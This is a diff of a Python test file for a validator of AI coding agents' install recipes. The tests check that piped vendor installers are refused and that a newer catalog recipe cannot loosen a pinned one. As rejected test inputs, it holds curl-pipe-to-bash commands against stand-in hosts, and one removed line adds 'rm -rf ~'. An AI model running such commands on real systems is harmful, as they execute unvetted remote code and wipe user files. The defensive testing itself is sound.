@@ -2,7 +2,9 @@
 Installed page (R95 step 2): the census's version against the registry's latest, each install its
 own job, Claude Code one of them in its own words, and the node agent's
 half run against a stub installer, never a vendor's."""
+import contextlib
 import hashlib
+import io
 import json
 import os
 import subprocess
@@ -16,6 +18,7 @@ HERE = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, os.path.join(HERE, ".."))
 import agentcode  # noqa: E402
 import agents  # noqa: E402
+import packformat  # noqa: E402
 import toolchains  # noqa: E402
 sys.path.insert(0, HERE)
 import agentpkg  # noqa: E402
@@ -243,7 +246,7 @@ class Controller(unittest.TestCase):
         # not even fetched: the index says its rev, so a press waits for
         # nothing (a press that waited ended no session: the node had
         # stopped counting as live by the time it looked).
-        asked = self.catalog(agents.get("codex").install | {"script": "curl -fsSL https://old.example/install.sh | sh"})
+        asked = self.catalog(agents.get("codex").install | {"bin": ".codex/old/codex"})
         self.assertEqual(agentcode.recipe("codex"), (agents.get("codex").install, "release"))
         agentcode.warm()
         self.assertEqual(asked, [])
@@ -278,9 +281,55 @@ class Controller(unittest.TestCase):
         for a in agents.TABLE:
             self.assertEqual(agents.install_checked(a.install), (a.install, ""), a.id)
         for bad in BAD_RECIPES:
-            self.assertTrue(agents.install_checked(GOOD | bad)[1], bad)
-        self.assertTrue(agents.install_checked(GOOD | {"rev": True})[1])
-        self.assertEqual(agents.install_checked(GOOD)[1], "")
+            self.assertTrue(agents.install_checked(HELD | bad)[1], bad)
+        self.assertTrue(agents.install_checked(HELD | {"rev": True})[1])
+        self.assertEqual(agents.install_checked(HELD)[1], "")
+        # A vendor's installer handed to a shell as it arrives is no recipe,
+        # however plain its one line is: refused as a shape, alone or beside
+        # a held recipe's parts.
+        for piped in (GOOD, OLD["codex-update"], HELD | {"script": GOOD["script"]}):
+            got, why = agents.install_checked(piped)
+            self.assertEqual((got, why[:33]), (None, "agent.install.script is no recipe"), piped)
+
+    def test_a_newer_recipe_held_to_less_than_the_table_s_is_refused(self):
+        # A higher rev is the catalog's word alone and never buys a weaker
+        # hold (packformat.replaces_refused): grok's recipe is pinned, so
+        # an installer that keeps the network does not replace it; codex's
+        # is an installer's, which a pinned one and another installer's do.
+        said = []
+        was = (agentcode.catalog_entry, agentcode.fetch_pack, dict(agentcode._recipes), agentcode.audit)
+        self.addCleanup(lambda: (setattr(agentcode, "catalog_entry", was[0]), setattr(agentcode, "fetch_pack", was[1]),
+                                 agentcode._recipes.clear(), agentcode._recipes.update(was[2]), setattr(agentcode, "audit", was[3])))
+        agentcode.audit = lambda who, action, target, params: said.append((who, action, target))
+        asked = []
+
+        def offer(recipe):
+            agentcode._recipes.clear()
+            said.clear()
+            asked.clear()
+            agentcode.catalog_entry = lambda name: {"name": name, "url": "https://example.test/catalog", "commit": "c" * 40, "sha256": "5" * 64,
+                                                    "path": "packs/agents/" + name, "install_rev": recipe["rev"]}
+            agentcode.fetch_pack = lambda *a, **kw: asked.append(a) or {"manifest": {"agent": {"install": recipe}}}
+        grok, codex = agents.get("grok").install, agents.get("codex").install
+        self.assertEqual((packformat.agent_held(grok)["word"], packformat.agent_held(codex)["word"]), ("pinned", "installer"))
+        # Pinned, and a pinned one newer: taken, and said once in the audit.
+        offer(grok | {"rev": grok["rev"] + 2})
+        self.assertEqual(agentcode.recipe("grok")[1], "catalog")
+        self.assertEqual(agentcode.recipe("grok")[1], "catalog")
+        self.assertEqual(said, [("catalog", "agent-recipe-taken", f"grok rev {grok['rev']} to {grok['rev'] + 2}")])
+        # Pinned, and an installer that keeps the network newer: refused, the table's stays, read once.
+        with contextlib.redirect_stdout(io.StringIO()) as out:
+            offer(HELD | {"rev": grok["rev"] + 2})
+            self.assertEqual(agentcode.recipe("grok"), (grok, "release"))
+            self.assertEqual(agentcode.recipe("grok"), (grok, "release"))
+        self.assertEqual((said, len(asked)), ([("catalog", "agent-recipe-refused", f"grok rev {grok['rev']} to {grok['rev'] + 2}")], 1))
+        self.assertIn("installer, where the shipped one is pinned", out.getvalue())
+        self.assertEqual(agentcode.row(node(), "grok")["held"]["word"], "pinned", "and its row says what the table's is held to")
+        # An installer's: another installer's and a pinned one are taken.
+        for theirs in (HELD | {"rev": codex["rev"] + 1}, PLACED | {"rev": codex["rev"] + 1}):
+            offer(theirs)
+            self.assertEqual(agentcode.recipe("codex"), (theirs, "catalog"))
+            self.assertEqual(said[0][1], "agent-recipe-taken")
 
     def test_an_official_pack_s_manifest_carries_it_and_no_other_pack_s_does(self):
         import toolpacks  # noqa: PLC0415
@@ -294,8 +343,8 @@ class Controller(unittest.TestCase):
         # would run more than its one installer always was.
         m["agent"]["install"] = a.install | {"steps": [["bash", "-c", "curl -fsSL https://x.example/i | bash"]]}
         self.assertIn("agent.install.steps", " ".join(toolpacks.validate(m, official=True)[1]))
-        m["agent"]["install"] = OLD["opencode-update"] | {"script": "curl -fsSL https://x.example/i | bash; rm -rf ~"}
-        self.assertIn("agent.install.script", " ".join(toolpacks.validate(m, official=True)[1]))
+        m["agent"]["install"] = OLD["opencode-update"]
+        self.assertIn("agent.install.script is no recipe", " ".join(toolpacks.validate(m, official=True)[1]))
 
     def test_every_shipped_agent_s_recipe_holds_what_it_fetches(self):
         # The five as the table ships them (agent-recipes.json): no recipe
